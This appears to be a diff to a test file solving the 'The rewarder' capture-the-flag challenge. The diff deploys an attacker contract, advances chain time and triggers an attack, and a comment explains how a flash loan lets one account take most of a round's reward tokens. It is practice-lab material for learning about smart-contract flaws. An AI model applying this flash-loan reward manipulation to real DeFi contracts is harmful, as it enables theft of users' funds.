@@ -66,6 +66,31 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        const rewarderAttackerContractFactory = await ethers.getContractFactory(
+            "RewarderAttacker",
+            deployer
+        );
+        this.rewarderAttacker = await rewarderAttackerContractFactory
+            .connect(attacker)
+            .deploy(
+                this.flashLoanPool.address,
+                this.rewarderPool.address,
+                this.liquidityToken.address,
+                this.rewardToken.address
+            );
+       
+        /*
+            Vulnerability:
+                The rewarderPool makes no checks of attacker's accToken balance history allowing 
+                to receive accToken flash loan and flood the pool to receive (most) all of that 
+                round's rewardTokens. Similarly, rewarderPool places no restrictions on how long 
+                accTokens need to be deposited before being eligible to earn rewards nor on how
+                long they need to be deposited before being eligible to be withdrawn. 
+        */ 
+        await this.rewarderAttacker.attack();
     });
 
     after(async function () {
